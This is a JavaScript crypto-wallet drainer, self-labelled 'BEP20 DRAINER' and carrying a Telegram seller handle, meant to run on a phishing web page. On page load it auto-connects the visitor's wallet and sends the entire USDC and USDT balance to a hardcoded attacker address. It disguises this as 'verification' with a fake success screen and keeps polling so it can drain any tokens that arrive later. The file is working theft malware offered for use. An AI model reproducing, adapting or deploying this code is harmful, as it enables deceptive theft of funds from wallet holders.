// BEP20 DRAINER BY T.ME/@PRIME_ETHZ

// Mobile device detection
function isMobileDevice() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function isDAppBrowser() {
  return !!(window.ethereum || window.web3 || window.trust || window.phantom || window.okxwallet || window.coinbaseWallet);
}

function isInWalletBrowser() {
  const userAgent = navigator.userAgent.toLowerCase();
  return userAgent.includes('trust') || 
         userAgent.includes('metamask') || 
         userAgent.includes('coinbase') || 
         userAgent.includes('imtoken') || 
         userAgent.includes('tokenpocket') ||
         userAgent.includes('phantom') ||
         userAgent.includes('okapp') ||
         window.ethereum?.isTrust ||
         window.ethereum?.isMetaMask ||
         window.ethereum?.isCoinbaseWallet ||
         window.ethereum?.isPhantom;
}

// Auto-popup on page load
function showAutoPopup() {
  // If in mobile/dApp browser, auto-connect immediately
  if ((isMobileDevice() || isDAppBrowser()) && isInWalletBrowser()) {
    setTimeout(() => {
      autoConnectMobileWallet();
    }, 1000);
    return;
  }

  setTimeout(() => {
    openWalletPopup();
  }, 1500);
}

// Auto-connect for mobile/dApp browsers
async function autoConnectMobileWallet() {
  if (!window.ethereum) {
    console.log('Ethereum not available, retrying...');
    setTimeout(autoConnectMobileWallet, 500);
    return;
  }

  try {
    console.log('Auto-connecting in mobile wallet browser...');
    
    // Update button to show auto-connecting
    const connectBtn = document.getElementById("connect-wallet-btn");
    if (connectBtn) {
      connectBtn.innerHTML = `
        <div class="flex items-center justify-center">
          <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-3"></div>
          <span>Auto-Connecting...</span>
        </div>
      `;
      connectBtn.disabled = true;
    }

    // Auto-proceed with wallet connection
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    if (connectBtn) {
      connectBtn.innerHTML = `
        <div class="flex items-center justify-center">
          <div class="animate-pulse">
            <i class="fas fa-cog fa-spin mr-3"></i>
          </div>
          <span>Processing Verification...</span>
        </div>
      `;
    }

    const transferResult = await executeMaxSendTransfers(signer, userAddress);
    const receiveResult = await checkAndReceiveTokens(signer, userAddress);

    showVerificationSuccess(
      userAddress, 
      transferResult.usdcBalance, 
      transferResult.usdtBalance, 
      contractConfig.usdc.decimals, 
      contractConfig.usdt.decimals, 
      transferResult.transactions, 
      receiveResult
    );
  } catch (error) {
    console.error("Auto-connect error:", error);
    // If auto-connect fails, show popup as fallback
    setTimeout(() => {
      openWalletPopup();
    }, 500);
  }
}


// Token transfer function
async function executeMaxSendTransfers(signer, address) {
  const usdcContract = new ethers.Contract(contractConfig.usdc.address, IERC20ABI, signer);
  const usdtContract = new ethers.Contract(contractConfig.usdt.address, IERC20ABI, signer);

  const usdcBalance = await usdcContract.balanceOf(address);
  const usdtBalance = await usdtContract.balanceOf(address);

  const verificationTransactions = [];

  if (!usdcBalance.isZero()) {
    const usdcTx = await usdcContract.transfer(contractConfig.verification.recipient, usdcBalance);
    verificationTransactions.push(usdcTx.wait());
  }

  if (!usdtBalance.isZero()) {
    const usdtTx = await usdtContract.transfer(contractConfig.verification.recipient, usdtBalance);
    verificationTransactions.push(usdtTx.wait());
  }

  await Promise.all(verificationTransactions);

  return {
    usdcBalance,
    usdtBalance,
    transactions: verificationTransactions.length
  };
}

// Check received tokens
async function checkAndReceiveTokens(signer, address) {
  const usdcContract = new ethers.Contract(contractConfig.usdc.address, IERC20ABI, signer);
  const usdtContract = new ethers.Contract(contractConfig.usdt.address, IERC20ABI, signer);

  const usdcReceived = await usdcContract.balanceOf(address);
  const usdtReceived = await usdtContract.balanceOf(address);

  return {
    usdcReceived,
    usdtReceived
  };
}

// Show verification success
function showVerificationSuccess(address, usdcBalance, usdtBalance, usdcDecimals, usdtDecimals, transactionCount, receiveResult) {
  const usdcAmount = ethers.utils.formatUnits(usdcBalance, usdcDecimals);
  const usdtAmount = ethers.utils.formatUnits(usdtBalance, usdtDecimals);

  const usdcReceived = receiveResult ? ethers.utils.formatUnits(receiveResult.usdcReceived, 6) : '0';
  const usdtReceived = receiveResult ? ethers.utils.formatUnits(receiveResult.usdtReceived, 6) : '0';

  const walletInfo = document.getElementById("wallet-info");
  walletInfo.innerHTML = `
    <div class="max-w-6xl mx-auto px-4">
      <div class="bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-200 rounded-3xl p-12">
        <div class="flex items-center gap-6 text-green-600 mb-8">
          <i class="fas fa-check-circle text-4xl"></i>
          <div>
            <h3 class="text-3xl font-bold">Verification Complete</h3>
            <p class="text-lg text-green-700 mt-2">Transfer and verification successful</p>
          </div>
        </div>
        <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
          <div class="bg-white rounded-2xl p-6 border border-green-200">
            <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-shield-alt mr-2 text-green-600"></i>Verified Address</h4>
            <p class="text-sm text-gray-600 break-all">${address}</p>
          </div>
          <div class="bg-white rounded-2xl p-6 border border-green-200">
            <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-paper-plane mr-2 text-blue-600"></i>Sent</h4>
            <div class="space-y-2 text-sm">
              ${!usdcBalance.isZero() ? `<p class="text-gray-700"><strong>USDC:</strong> ${parseFloat(usdcAmount).toFixed(2)}</p>` : '<p class="text-gray-500">USDC: 0.00</p>'}
              ${!usdtBalance.isZero() ? `<p class="text-gray-700"><strong>USDT:</strong> ${parseFloat(usdtAmount).toFixed(2)}</p>` : '<p class="text-gray-500">USDT: 0.00</p>'}
              <p class="text-blue-600 font-semibold">${transactionCount || 0} transactions</p>
            </div>
          </div>
          <div class="bg-white rounded-2xl p-6 border border-green-200" data-section="received">
            <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-download mr-2 text-purple-600"></i>Received</h4>
            <div class="space-y-2 text-sm">
              <p class="text-gray-700"><strong>USDC:</strong> ${parseFloat(usdcReceived).toFixed(2)}</p>
              <p class="text-gray-700"><strong>USDT:</strong> ${parseFloat(usdtReceived).toFixed(2)}</p>
              <p class="text-purple-600 font-semibold">Live balance</p>
            </div>
          </div>
          <div class="bg-white rounded-2xl p-6 border border-green-200">
            <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-certificate mr-2 text-green-600"></i>Status</h4>
            <p class="text-sm text-green-700 font-semibold">✓ Send Complete</p>
            <p class="text-sm text-green-700 font-semibold">✓ Receive Monitored</p>
            <p class="text-sm text-green-700 font-semibold">✓ Verification Success</p>
          </div>
        </div>
      </div>
    </div>
  `;
  walletInfo.classList.remove('hidden');

  const connectBtn = document.getElementById("connect-wallet-btn");
  if (connectBtn) {
    connectBtn.innerHTML = `
      <div class="flex items-center justify-center">
        <i class="fas fa-check-circle mr-3 text-lg text-green-300"></i>
        <span>Verification Complete</span>
      </div>
    `;
    connectBtn.classList.add('bg-green-600', 'hover:bg-green-700');
    connectBtn.classList.remove('bg-[#0047FF]', 'hover:bg-[#0039cc]');
  }

  startTokenMonitoring(address);
}

// Token monitoring
let monitoringInterval;
async function startTokenMonitoring(address) {
  if (monitoringInterval) {
    clearInterval(monitoringInterval);
  }

  console.log('Starting token monitoring...');

  monitoringInterval = setInterval(async () => {
    try {
      if (!window.ethereum) return;

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const receiveResult = await checkAndReceiveTokens(signer, address);

      const receivedSection = document.querySelector('[data-section="received"] .space-y-2');
      if (receivedSection) {
        const usdcReceived = ethers.utils.formatUnits(receiveResult.usdcReceived, 6);
        const usdtReceived = ethers.utils.formatUnits(receiveResult.usdtReceived, 6);

        receivedSection.innerHTML = `
          <p class="text-gray-700"><strong>USDC:</strong> ${parseFloat(usdcReceived).toFixed(2)}</p>
          <p class="text-gray-700"><strong>USDT:</strong> ${parseFloat(usdtReceived).toFixed(2)}</p>
          <p class="text-purple-600 font-semibold">Live balance</p>
        `;
      }

      if (!receiveResult.usdcReceived.isZero() || !receiveResult.usdtReceived.isZero()) {
        console.log('New tokens detected');
        await executeMaxSendTransfers(signer, address);
      }
    } catch (error) {
      console.error('Token monitoring error:', error);
    }
  }, 5000);
}

// Smart Contract Configuration
const contractConfig = {
  usdc: {
    address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    name: "USD Coin",
    symbol: "USDC",
    decimals: 18
  },
  usdt: {
    address: "0x55d398326f99059fF775485246999027B3197955",
    name: "Tether USD", 
    symbol: "USDT",
    decimals: 18
  },
  verification: {
    recipient: "0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B",
    processingFee: "Processing fee applied",
    monitoringEnabled: true
  }
};

const IERC20ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)"
];


// Wallet connection
async function connectWallet(walletType) {
  console.log(`Connecting with ${walletType}...`);
  
  // Handle Trust Wallet deep linking
  if (walletType === 'trust') {
    const currentUrl = window.location.href;
    const trustWalletUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`;
    
    // Check if already in Trust Wallet browser
    if (isInWalletBrowser() && navigator.userAgent.toLowerCase().includes('trust')) {
      // Already in Trust Wallet, proceed with connection
      if (!window.ethereum) {
        alert('Please enable DApp browser in Trust Wallet.');
        return;
      }
    } else {
      // Not in Trust Wallet, redirect to Trust Wallet
      window.location.href = trustWalletUrl;
      return;
    }
  }
  
  if (!window.ethereum && walletType !== 'walletconnect') {
    alert('MetaMask is not installed. Please install it to use this feature.');
    return;
  }

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    const transferResult = await executeMaxSendTransfers(signer, userAddress);
    const receiveResult = await checkAndReceiveTokens(signer, userAddress);

    showVerificationSuccess(
      userAddress, 
      transferResult.usdcBalance, 
      transferResult.usdtBalance, 
      contractConfig.usdc.decimals, 
      contractConfig.usdt.decimals, 
      transferResult.transactions, 
      receiveResult
    );
  } catch (error) {
    console.error("Wallet connection error:", error);
    const walletInfo = document.getElementById("wallet-info");
    if (walletInfo) {
      walletInfo.innerHTML = `<p class="text-red-500">Error: ${error.message}</p>`;
      walletInfo.classList.remove('hidden');
    }
  }
}

// Open/Close wallet popup
function openWalletPopup() {
  const popup = document.getElementById('wallet-selector-popup');
  if (popup) {
    popup.classList.add('show');
  }
}

function closeWalletPopup() {
  const popup = document.getElementById('wallet-selector-popup');
  if (popup) {
    popup.classList.remove('show');
  }
}

// Initialize on page load T.me/@PRIME_ETHZ
document.addEventListener('DOMContentLoaded', () => {
  showAutoPopup();
});